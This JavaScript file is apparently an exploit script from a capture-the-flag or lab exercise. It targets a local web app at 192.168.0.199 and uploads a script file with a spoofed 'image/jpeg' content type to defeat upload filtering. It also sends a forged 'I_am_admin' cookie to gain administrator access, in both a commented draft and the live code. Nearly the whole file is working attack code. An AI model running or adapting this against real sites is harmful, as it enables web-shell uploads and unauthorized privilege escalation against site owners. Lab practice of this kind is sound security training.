// import { readFile, appendFile } from 'node:fs/promises';

// const buffer = await readFile('./script.php');

// const file = new File(
//   [buffer],
//   'script.php',
//   // { type: 'text/javascript' }
//   { contentType: 'image/jpeg' },
// );

// const formData = new FormData();
// formData.append('file', file, 'script.php');
// formData.append('MAX_FILE_SIZE', 10_000); //?
// formData.append('Upload', 'Upload'); //?

// console.log('[ form data ]:', formData);
// const response = await fetch('http://192.168.0.199/index.php?page=upload', {
//   'headers': {
//     'accept':
//       'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
//     'accept-language': 'en-US,en;q=0.9',
//     'cache-control': 'max-age=0',
//     //   ...formData.getHeaders(),
//     'upgrade-insecure-requests': '1',
//     'cookie': 'I_am_admin=68934a3e9455fa72420237eb05902327',
//     'Referer': 'http://192.168.0.199/index.php?page=upload',
//     'Referrer-Policy': 'strict-origin-when-cross-origin',
//   },
//   'body': formData,
//   'method': 'POST',
// });

// const res = await response.text();
// await appendFile('./result.html', res, 'utf8');
// console.log(res);

import fetch from 'node-fetch';
import formData from 'form-data';
import fs from 'fs/promises';
import { readFile, appendFile } from 'node:fs/promises';

async function main() {
  try {
    const form = new formData();
    // form.append('uploaded', await fs.readFile('./script.php'), {
    form.append('uploaded', await fs.readFile('./test_script.js'), {
      contentType: 'image/jpeg',
    //   filename: 'script.php',
      filename: 'test_script.js',
    });
    form.append('MAX_FILE_SIZE', 10_000);
    form.append('Upload', 'Upload');

    console.log(form.getHeaders());

    const response = await fetch('http://192.168.0.199/?page=upload', {
      'headers': {
        'accept':
          'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'cookie': 'I_am_admin=68934a3e9455fa72420237eb05902327',
        'Referer': 'http://192.168.0.199/?page=upload',
        'Referrer-Policy': 'strict-origin-when-cross-origin',
      },
      'body': form,
      'method': 'POST',
    });

    const res = await response.text();
    await appendFile('./result.html', res, 'utf8');
    console.log(res);
    // console.log(await response.text());
  } catch (e) {
    console.error(e);
  }
}

main();
